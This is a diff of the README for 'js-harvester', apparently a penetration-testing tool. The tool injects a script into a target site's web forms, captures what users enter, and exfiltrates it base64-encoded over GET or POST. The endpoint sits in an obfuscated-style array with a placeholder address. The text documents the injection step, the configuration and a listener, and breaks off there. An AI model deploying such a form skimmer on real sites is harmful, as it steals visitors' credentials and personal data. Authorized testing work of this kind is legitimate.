@@ -1,12 +1,12 @@
 # js-harvester
-A tool for pen testers to use in an engagement where data must be captured from a web form.
+This is a tool for pen testers to use in an engagement where data must be captured from a web form.
 > [!CAUTION]
-> Disclaimer: Intended only for use on systems that you are legally authorized to access. 
+> Disclaimer: Intended only for use on systems that you are legally authorized to access.
 # installation
 * Requires jQuery
-* Download and host script
+* Ability to inject harvest.js to the target site
 # usage
-1. Identify target page to harvest data from
+1. Identify target page to harvest data from (see example-forms for reference/test materials)
 3. Add harvest.js to the target page
 ```
 <script type="text/javascript" src="harvest.js"></script>
@@ -27,6 +27,13 @@ var enableEncoding = true;
 var usePost = false;
 var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 ```
+* <b>siteId and formId:</b> The siteId and formId values were originally hardcoded. These values are now dynamically generated based on the form properties (host, page, form name)
+* <b>bindAllFormsSwitch:</b> boolean value 'true' or 'false'. true will bind all forms on the page, false will bind the form name specified by 'formName'
+* <b>formName:</b> required if not binding all forms on the page (see bindAllFormsSwitch)
+* <b>enableEncoding:</b> enables base64 encoding of exfiltrated data, may expand to other encoding types/formats
+* <b>usePost:</b> boolean value 'true' or 'false'. indicates whether a POST request should be used for data exfiltration, default is to use GET
+* <b>_0x3745:</b> array of values used for data exfiltration, the first 4 need to be customized for the data exfiltration endpoint
+
 5. Listen. . .
 ```
 ┌──(kali㉿hammer)-[~/tools/js-harvester/server]
